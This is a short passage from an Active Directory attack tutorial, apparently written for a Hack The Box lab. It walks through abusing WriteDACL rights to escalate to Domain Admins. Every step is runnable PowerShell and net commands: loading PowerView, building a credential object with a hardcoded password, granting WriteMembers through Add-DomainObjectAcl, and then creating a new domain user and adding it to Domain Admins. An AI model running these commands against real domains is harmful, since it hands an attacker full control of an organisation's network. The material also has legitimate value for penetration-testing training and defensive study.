#### **1. Groups: Add a Member to a Group**

**Scenario:**  
You have `WriteDACL` over a group (e.g., "Domain Admins"). Use it to grant yourself the ability to add members.

**Steps:**

1. **Import PowerView**  
   Import the PowerView module to enable Active Directory manipulation:
   ```powershell
   import-module .\powerview.ps1
   ```

2. **Set Up Credentials**  
   Create a secure credential object for the user with `WriteDACL` privileges:
   ```powershell
   $pass = convertto-securestring 'abc123!' -asplain -force
   $cred = new-object system.management.automation.pscredential('htb\MG', $pass)
   ```

3. **Modify DACL to Grant WriteMembers**  
   Use `Add-DomainObjectAcl` to allow your account to add members to the target group:
   ```powershell
   Add-DomainObjectAcl -TargetIdentity "Domain Admins" -Rights WriteMembers -PrincipalIdentity MG -Credential $cred
   ```
   - **Why:** This modifies the DACL of the group to give the `MG` user permission to manage its membership.

4. **Add a New Member to the Group**  
   Once the DACL is modified, add a user (e.g., `NewUser`) to the group:
   ```powershell
   net user NewUser SecurePass123! /add /domain
   net group "Domain Admins" NewUser /add /domain
   ```

---
